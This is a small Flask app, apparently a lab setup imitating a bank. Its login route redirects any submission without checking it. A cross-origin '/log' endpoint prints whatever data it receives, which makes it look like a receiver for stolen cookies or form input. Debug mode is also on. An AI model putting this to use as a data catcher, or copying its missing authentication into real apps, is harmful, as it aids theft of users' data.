from flask import Flask, render_template, request, redirect
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Security logging function
def log_security_event(event_type, ip_address, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] [{event_type}] IP: {ip_address} | {details}\n"
    with open("security.log", "a", encoding="utf-8") as log_file:
        log_file.write(log_line)

@app.route("/login", methods=["POST"])
def login():
    # This route handles the form submission and redirects to the bank dashboard
    return redirect("/secure-zone/bank")

@app.route("/secure-zone/bank")
def bank_dashboard():
    return render_template("bank.html")

@app.route("/log", methods=['GET', 'POST'])
def log_data():
    if request.args:
        print(f"\n--- [!] New data received (GET) ---")
        for key, value in request.args.items():
            print(f"{key}: {value}")
    return "OK", 200

if __name__ == "__main__":
    app.run(debug=True, port=5000)
